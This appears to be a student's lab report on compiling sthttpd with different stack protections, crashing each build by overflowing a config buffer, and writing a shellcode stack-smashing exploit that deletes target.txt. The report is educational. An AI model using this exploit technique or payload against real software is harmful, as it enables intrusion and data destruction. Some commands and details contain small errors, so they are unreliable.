@@ -1,0 +1,477 @@
+Precedure:
+
+1. I first downloaded the sthttpd 2.27.0 zipped file from the lab specification webpage
+and unzipped the file. With the file unzipped, I used sublime text to open thttpd.c and
+libhttpd.c under the src folder and edited the specific lines of code mentioned in the
+patch. After saving the edits for both source file, I copied the entire sthttpd 2.27.0
+using remote desktop onto my seasnet machine. Before I compile the source file into
+three executables, I first make sure that I are using the correct version of gcc. 
+To do this, I use the command:
+	export PATH="/usr/local/cs/bin:$PATH"
+Then I use another command to change the directory to sthttpd-2.27.0:
+	cd sthttpd-2.27.0
+
+2. To compile the source code into three executables using three different flags, we
+first run the command:
+	./configure \
+		LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+Then for each flag I use a different group of three commands to create the executable:
+	-(SP) for strong stack protection:
+		make clean 
+		make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+		mv src/thttpd src/thttpd-sp
+	-(AS) for address sanitization:
+		make clean
+		make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+		mv src/thttpd src/thttpd-as
+	-(NO) for neither:
+		make clean
+		make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+		mv src/thttpd src/thttpd-no
+
+3. For this step, need to run each executable under GDB on three unique ports. The port 
+numbers can be determined by the equation (12330 + 3 * (X % 293) + Y), where X is my 
+student ID and Y is 1, 2 , or 3 for SP, AS, and NO, respectively. 
+The resulting commands using the three calculated port numbers are as follows:
+	-SP:
+		src/thttpd-sp -p 12784 -D
+	-AS:
+		src/thttpd-as -p 12785 -D
+	-NO:
+		src/thttpd-no -p 12786 -D
+
+4. As I run each of the three commands above, I see that each of these commands would cause
+the terminal to "hang," meaning the terminal would stop taking additional commands. Despite the
+terminal hanging, I can open another terminal to test if the current command that caused the
+terminal to hang is working. To perform the test, I enter the following commands in a new
+terminal after each of the command from step 3 has caused a hang (For example, if the AS command
+from step 3 is currently causing the ternimal to hang, I would enter the command indicated for
+AS below in the new terminal):
+	-SP:
+		curl http://localhost:12784/foo.txt
+	-AS:
+		curl http://localhost:12785/foo.txt 
+	-NO:
+		curl http://localhost:12786/foo.txt
+The foo.txt file is just a new file I created that contains 270 "=" characters for testing
+purposes. These three commands would return a message saying that foo.txt is not world-readable;
+however, the fact that the commands did not return "Connection refused" is enough to prove that
+the web servers are working.
+
+5. To break the SP version of the code, I attempt to overrun the stack of the
+read_config function by creating a path.txt that contains the initial keyword "port="
+followed by 200 "1" characters. I do this so I can overrun the limit of the buffer,
+which I have reduced to 100 characters in step 1. Now to execute the crash, I run the
+below commands:
+
+	gdb src/thttpd-sp
+	run -p 12784 -D -C path.txt
+
+GDB then tells us that a segmentation fault has happened, and I use the bracktrace
+command in GDB to get the
+result below:
+
+	#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+	#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+	#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
+	#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
+	#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+	#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+	#6  0x0000000000405056 in read_config (filename=<optimized out>) at thttpd.c:1190
+	#7  0x3131313131313131 in ?? ()
+	#8  0x3131313131313131 in ?? ()
+	#9  0x3131313131313131 in ?? ()
+	#10 0x3131313131313131 in ?? ()
+	#11 0x3131313131313131 in ?? ()
+	#12 0x3131313131313131 in ?? ()
+	#13 0x3131313131313131 in ?? ()
+	#14 0x3131313131313131 in ?? ()
+	#15 0x3131313131313131 in ?? ()
+	#16 0x3131313131313131 in ?? ()
+	#17 0x3131313131313131 in ?? ()
+	#18 0x3131313131313131 in ?? ()
+	#19 0x3131313131313131 in ?? ()
+	#20 0x3131313131313131 in ?? ()
+	#21 0x3131313131313131 in ?? ()
+	#22 0x3131313131313131 in ?? ()
+	#23 0x3131313131313131 in ?? ()
+	#24 0x3131313131313131 in ?? ()
+	#25 0x3131313131313131 in ?? ()
+	#26 0x3131313131313131 in ?? ()
+	#27 0x3131313131313131 in ?? ()
+	#28 0x3131313131313131 in ?? ()
+	#29 0x3131313131313131 in ?? ()
+	#30 0x3131313131313131 in ?? ()
+	#31 0x3131313131313131 in ?? ()
+	#32 0x3131313131313131 in ?? ()
+	#33 0x3131313131313131 in ?? ()
+	#34 0x3131313131313131 in ?? ()
+	#35 0x3131313131313131 in ?? ()
+	#36 0x3131313131313131 in ?? ()
+	#37 0x3131313131313131 in ?? ()
+	#38 0x3131313131313131 in ?? ()
+	#39 0x3131313131313131 in ?? ()
+	#40 0x3131313131313131 in ?? ()
+	#41 0x3131313131313131 in ?? ()
+	#42 0x3131313131313131 in ?? ()
+	#43 0x3131313131313131 in ?? ()
+	#44 0x3131313131313131 in ?? ()
+	#45 0x3131313131313131 in ?? ()
+	#46 0x3131313131313131 in ?? ()
+	#47 0x0000003131313131 in ?? ()
+	#48 0x0000000000000000 in ?? ()
+
+
+From the above backtrace I see that the program crashed at line 1190, therefore we
+set a breakpoint and attempt to examine the machine code at around line 1190 with the
+following commands:
+
+	break 1190
+	run -p 12785 -D -C path.txt
+	set disassemble-next-line on
+	si
+
+Now I see the lines below in the terminal:
+
+	0x0000000000404f28      1190        }
+	   0x0000000000404f23 <read_config+1219>:       48 8b 44 24 68  mov    0x68(%rsp),%rax
+	=> 0x0000000000404f28 <read_config+1224>:       64 48 33 04 25 28 00 00 00      xor    %fs:0x28,%rax
+	   0x0000000000404f31 <read_config+1233>:       0f 85 1a 01 00 00       jne    0x405051 <read_config+1521>
+	   0x0000000000404f37 <read_config+1239>:       48 83 c4 70     add    $0x70,%rsp
+	   0x0000000000404f3b <read_config+1243>:       5b      pop    %rbx
+	   0x0000000000404f3c <read_config+1244>:       5d      pop    %rbp
+	   0x0000000000404f3d <read_config+1245>:       41 5c   pop    %r12
+	   0x0000000000404f3f <read_config+1247>:       41 5d   pop    %r13
+	   0x0000000000404f41 <read_config+1249>:       41 5e   pop    %r14
+	   0x0000000000404f43 <read_config+1251>:       c3      retq
+
+This code at line 404f31 suggests that the function is trying to compare a value with
+another value, and the code on the next line suggests that the program would jump to
+line 405051 if the previous comparison returns that the two values are not equal.
+Knowing that the SP flag uses a canary value to detect buffer overflow by checking if
+the canary value in the stack has been changed. I can assume that the code at line
+404f31 is the verification of the canary value. Since I know that the stack has been 
+altered (I did it myself) and that the canary must have been changed in the process as 
+well, I know that the jump on line 404f31 must have happened.
+To verify my claim, I used the ni command to skip to the next step in the code, and the
+line below is
+returned:
+
+	=> 0x0000000000405051 <read_config+1521>:       e8 5a d4 ff ff  callq  0x4024b0 <__stack_chk_fail@plt>
+
+This result fits the result from our previous backtrace, and the program crashes with 
+a call to __stack_chk_fail just as indicated by the backtrace. 
+
+
+6. To break the AS version of the code, I used the same commands I have used to break SP 
+version of the code, except I changed the port number in the second command to match that
+of the AS executable. The commands are as follows:
+
+	gdb src/thttpd-as
+	run -p 12785 -D -C path.txt
+
+Once again, GDB returns that there has been a buffer overflow, since I was trying to
+overwrite the stack. So I ran the backtrace command again to see which line the program
+crashed on. Below is the result of the backtrace:
+
+	#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+	#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+	#2  0x00000000004b8ae3 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
+	    this=0x7fffffffbd40, pc=4435657, max_depth=<optimized out>)
+	    at ../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
+	#3  0x00000000004b42e1 in __asan::GetStackTraceWithPcBpAndContext (fast=false,
+	    context=0x0, bp=140737488342560, pc=4435657, max_depth=256, stack=0x7fffffffbd40)
+	    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
+	#4  __asan::ReportGenericError (pc=<optimized out>, bp=bp@entry=140737488342560,
+	    sp=sp@entry=140737488340432, addr=addr@entry=140737488342724,
+	    is_write=is_write@entry=false, access_size=access_size@entry=478,
+	    exp=<optimized out>, fatal=<optimized out>)
+	    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
+	#5  0x000000000043aee4 in __interceptor_strchr (str=<optimized out>, c=<optimized out>)
+	    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+	#6  0x00000000004e0b51 in read_config (filename=<optimized out>) at thttpd.c:1018
+	#7  0x3131313131313131 in ?? ()
+	#8  0x3131313131313131 in ?? ()
+	#9  0x3131313131313131 in ?? ()
+	#10 0x3131313131313131 in ?? ()
+	#11 0x3131313131313131 in ?? ()
+	#12 0x3131313131313131 in ?? ()
+	#13 0x3131313131313131 in ?? ()
+	#14 0x3131313131313131 in ?? ()
+	#15 0x3131313131313131 in ?? ()
+	#16 0x3131313131313131 in ?? ()
+	#17 0x3131313131313131 in ?? ()
+	#18 0x3131313131313131 in ?? ()
+	#19 0x3131313131313131 in ?? ()
+	#20 0x3131313131313131 in ?? ()
+	#21 0x3131313131313131 in ?? ()
+	#22 0x3131313131313131 in ?? ()
+	#23 0x3131313131313131 in ?? ()
+	#24 0x3131313131313131 in ?? ()
+	#25 0x3131313131313131 in ?? ()
+	#26 0x3131313131313131 in ?? ()
+	#27 0x3131313131313131 in ?? ()
+	#28 0x3131313131313131 in ?? ()
+	#29 0x3131313131313131 in ?? ()
+	#30 0x3131313131313131 in ?? ()
+	#31 0x3131313131313131 in ?? ()
+	#32 0x3131313131313131 in ?? ()
+	#33 0x3131313131313131 in ?? ()
+	#34 0x3131313131313131 in ?? ()
+	#35 0x3131313131313131 in ?? ()
+	#36 0x3131313131313131 in ?? ()
+	#37 0x3131313131313131 in ?? ()
+	#38 0x3131313131313131 in ?? ()
+	#39 0x0000003131313131 in ?? ()
+	#40 0x0000000000000000 in ?? ()
+
+
+We see from the above backtrace that the program again breaks at line 1018. So we set a
+break point at 1018 and try to examine the code around that line using the commands
+below:
+
+	break 1018
+	run -p 12785 -D -C path.txt
+	set disassemble-next-line on
+	si
+
+Now I see the below code in my terminal:
+
+	0x00000000004e0b4c      1018            if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+	   0x00000000004e0b43 <read_config+179>:        48 8b 3c 24     mov    (%rsp),%rdi
+	   0x00000000004e0b47 <read_config+183>:        be 23 00 00 00  mov    $0x23,%esi
+	=> 0x00000000004e0b4c <read_config+188>:        e8 2f a5 f5 ff  callq  0x43b080 <__interceptor_strchr(char const*, int)>
+	   0x00000000004e0b51 <read_config+193>:        48 85 c0        test   %rax,%rax
+	   0x00000000004e0b54 <read_config+196>:        74 24   je     0x4e0b7a <read_config+234>
+
+The AS flag turns on AddressSanitizer, which is a memory error detector that would
+actively check for memory corruption. In the case of the code above,
+the function __interceptor_strchr is called on line 4e0b4c to check for possible memory 
+error. I knew that __interceptor_strchr indeed found a memory error since the backtrace
+indicates that the function __interceptor_strchr triggered the program to crash in the
+first place. 
+
+7. To break the NO version of the code, I used the same set of commands I did for the
+two previous steps:
+
+	gdb src/thttpd-no
+	run -p 12786 -D -C path.txt
+
+I see that once again, GDB notified me that there is a segmentation fault. So I used the
+backtrace command again to figure out on which line the code crashed. Below is the
+result of the backtrace:
+
+	#0  0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+	#1  0x3131313131313131 in ?? ()
+	#2  0x3131313131313131 in ?? ()
+	#3  0x3131313131313131 in ?? ()
+	#4  0x3131313131313131 in ?? ()
+	#5  0x3131313131313131 in ?? ()
+	#6  0x3131313131313131 in ?? ()
+	#7  0x3131313131313131 in ?? ()
+	#8  0x3131313131313131 in ?? ()
+	#9  0x3131313131313131 in ?? ()
+	#10 0x3131313131313131 in ?? ()
+	#11 0x3131313131313131 in ?? ()
+	#12 0x3131313131313131 in ?? ()
+	#13 0x3131313131313131 in ?? ()
+	#14 0x3131313131313131 in ?? ()
+	#15 0x3131313131313131 in ?? ()
+	#16 0x3131313131313131 in ?? ()
+	#17 0x3131313131313131 in ?? ()
+	#18 0x3131313131313131 in ?? ()
+	#19 0x3131313131313131 in ?? ()
+	#20 0x3131313131313131 in ?? ()
+	#21 0x3131313131313131 in ?? ()
+	#22 0x3131313131313131 in ?? ()
+	#23 0x3131313131313131 in ?? ()
+	#24 0x3131313131313131 in ?? ()
+	#25 0x3131313131313131 in ?? ()
+	#26 0x3131313131313131 in ?? ()
+	#27 0x3131313131313131 in ?? ()
+	#28 0x3131313131313131 in ?? ()
+	#29 0x3131313131313131 in ?? ()
+	#30 0x3131313131313131 in ?? ()
+	#31 0x3131313131313131 in ?? ()
+	#32 0x3131313131313131 in ?? ()
+	#33 0x3131313131313131 in ?? ()
+	#34 0x3131313131313131 in ?? ()
+	#35 0x3131313131313131 in ?? ()
+	#36 0x3131313131313131 in ?? ()
+	#37 0x3131313131313131 in ?? ()
+	#38 0x3131313131313131 in ?? ()
+	#39 0x3131313131313131 in ?? ()
+	#40 0x3131313131313131 in ?? ()
+	#41 0x0000003131313131 in ?? ()
+	#42 0x0000000000000000 in ?? ()
+
+I see that the code has crashed at line 1190, so I set a break point at line 1190 in
+order to checkout the code around line 1190. I used the commands below:
+
+	break 1018
+	run -p 12786 -D -C path.txt
+	set disassemble-next-line on
+	si
+
+Now I see the instructions below on my terminal:
+
+	0x0000000000404d93 <read_config+1203>:       48 83 c4 70     add    $0x70,%rsp
+	=> 0x0000000000404d97 <read_config+1207>:       5b      pop    %rbx
+	   0x0000000000404d98 <read_config+1208>:       5d      pop    %rbp
+	   0x0000000000404d99 <read_config+1209>:       41 5c   pop    %r12
+	   0x0000000000404d9b <read_config+1211>:       41 5d   pop    %r13
+	   0x0000000000404d9d <read_config+1213>:       41 5e   pop    %r14
+	   0x0000000000404d9f <read_config+1215>:       c3      retq
+
+Comparing the above instructions to those from the two previous versions of the program,
+I see that this version has no form of error checking at all before the contents of the
+stack are popped back out. This makes sense because the NO flag means that no additional
+error checking mechanism is added to the program. The only reason why GDB was able to
+notify us of the segmentation fault is because of error checking mechanisms that were
+built into the hardware were able to detect the buffer overflow. Another reason I came
+to this conclusion is that from the backtrace, we see that the program crashed at
+address 404d9f. I can see from the actual instructions above that 404d9f is precisely
+the address of the return instruction (so technically the return instruction crashed the
+program). This means that the error was not caught until
+the code has finished executing. 
+
+8. In order to examine the assembly code for the three executables, I first have to
+convert the executables into .s files that contain the assembly code instructions. I
+used the commands below for each variant of the program: 
+
+	-SP:
+		make clean
+		make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+		mv src/thttpd.o src/thttpd-sp.s
+	-AS:
+		make clean
+		make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
+		mv src/thttpd.o src/thttpd-as.s
+	-NO:
+		make clean
+		make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+		mv src/thttpd.o src/thttpd-no.s
+
+upon examining the implementation of handle_read from all three files, I came to the
+following conclusions on how each version of handle_read works:
+
+	-SP:
+		The way SP checks for buffer overflow is by checking if the canary value has
+		been altered. From my assembly instruction in step5, the program only verifies 
+		the canary value in the read_config function and only in read-config can u find 
+		__stack_chk_fail, which is what the program calls when the canary value has been
+		changed. Therefore, the handle_read function in SP is not altered at all since
+		its error checking mechanism does not require anything like that. 
+	-AS:
+		In AS, the AddressSanitizer save a shadow memory, which is a copy of memory it
+		makes to detect possible memory errors. So in order for AddressSanitizer to
+		utilize the shadow memory, it has to be always comparing the current memory to
+		shadow memory in an attempt to catch possible errors. Therefore, the added calls
+		to memory error detector cause the AS version of the .s file to be the largest
+		among the three, but also makes its implementation of handle_read stand apart
+		from the other. The AS version of handle_read is inserted with many calls to the
+		memory error detector. 
+	-NO:
+		Since the NO flag instructs gcc to not add any special error checking mechanism
+		to the program, the NO version of handle_read is simply an unaltered version of
+		the function. 
+
+9. To come up with the file that would exploit the bug that we introduced in step 1, I
+first have to determine the difference between the beginning of the buffer to the
+location of the return address (the size of the buffer). To find the beginning of the
+buffer, I used the below commands: 
+
+	gdb src/thttpd-no
+	break read_config
+	run -p 12786 -D -C config.txt
+	p &line
+
+These commands return the following line in the terminal:
+
+	$1 = (char (*)[100]) 0x7fffffffcfd0
+
+This means that the buffer begins at the address 0x7fffffffcfd0. Then we use the command
+below to find the location of the return address from %rsp:
+
+	info reg rsp
+
+Which returns the line below:
+
+	rsp            0x7fffffffd068   0x7fffffffd068
+
+This line indicates that the location of the return address is  0x7fffffffd068. To find
+the size of the buffer, I did 0x7fffffffd068 - 0x7fffffffcfd0 to get 0x98, which means a
+difference of 152 bytes. Now the lab specification told me to delete a file called
+"target.txt", so this string would also need to be in my exploit file somewhere. To
+represent this string in hex, I used an online converter to get the below hex pattern:
+	74 61 72 67 65 74 2e 74 78 74
+
+To actually use this as a string we also need to add the zero byte character at the end:
+
+	74 61 72 67 65 74 2e 74 78 74 00
+
+Next, I went up to piazza to find some helpful posts that suggested I should look into
+the unlink system call if I want to delete target.txt. Online sources told me that
+unlink takes an argument in %rdi as the name of the file it needs to delete and that it
+is called by using the syscall instruction while the value 0x57 in in %rax. With this
+new information I wrote the below instructions in a txt file code.txt:
+
+	movq	$0x7fffffffd058, %rdi
+	movq	$0x57, rax
+	syscall
+
+I used 0x7fffffffd058 as the argument to the unlink system call because I decided to put
+the string "target.txt" right in front of the location of the return address, so I did
+0x7fffffffd068 - 0xB - 0x5 = 0x7fffffffd058. What I did was subtracting the location of
+the return address by the size of the string and the offset of the string. 
+Since gcc would only take files with the .s extension, I changed code.txt to code.s and 
+used the below commands:
+
+	gcc -c code.s
+	objdump -d code.o
+
+And I got the results below from the above commands:
+
+	code.o:     file format elf64-x86-64
+
+
+	Disassembly of section .text:
+
+	0000000000000000 <.text>:
+	   0:   48 bf 58 d0 ff ff ff    movabs $0x7fffffffd058,%rdi
+	   7:   7f 00 00
+	   a:   48 c7 c0 57 00 00 00    mov    $0x57,%rax
+	  11:   0f 05                   syscall
+
+What I did above is turning the exploit code in assembly into its hex representation, and
+from the above objdump, I see that the assembly code's hex representation is:
+
+	48 bf 58 d0 ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05
+
+Also since I have to include the "port=" keyword, I need to add the length of the
+characters and the offset to the base address, which turns out to 0x7fffffffcfd0 + 0x8
+= 0x7fffffffcfd8. Now that we have all the pieces of the puzzle, we can construct the 
+actual expoit string:
+
+	00 00 00 48 bf 58 d0 ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05
+	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 74
+	61 72 67 65 74 2e 74 78 74 00 00 00 00 00 00 d8 cf ff ff ff 7f 00 00
+
+We also added a 3 byte offset at the very beginning to represent the offset of "port=".
+Immediately after that 3 byte offset, we have our exploit code followed by many bytes of
+filler code. At the very end is the string "target.txt" followed by the zero byte, its
+offset, and the address of the beginning of the buffer + 8 (0x7fffffffcfd8). Since the
+machine is little endian, we entered the address backwards. The above chunk of hex code
+has a total of 147 bytes, if I add "port=" before all this, I would get 152 bytes total. 
+Before we acutally deploy the exploit, I had to convert the hex code into raw code. I
+did this with an online converter tool I found by googling. With the hex code coverted
+to raw code, I now add the keyword "port=" in front of all the raw code and saved it all
+in exploit.txt. 
+Using the command below, I was able to successfully delete target.txt:
+
+	gdb src/thttpd-no
+	run -p 12786 -D -C exploit.txt
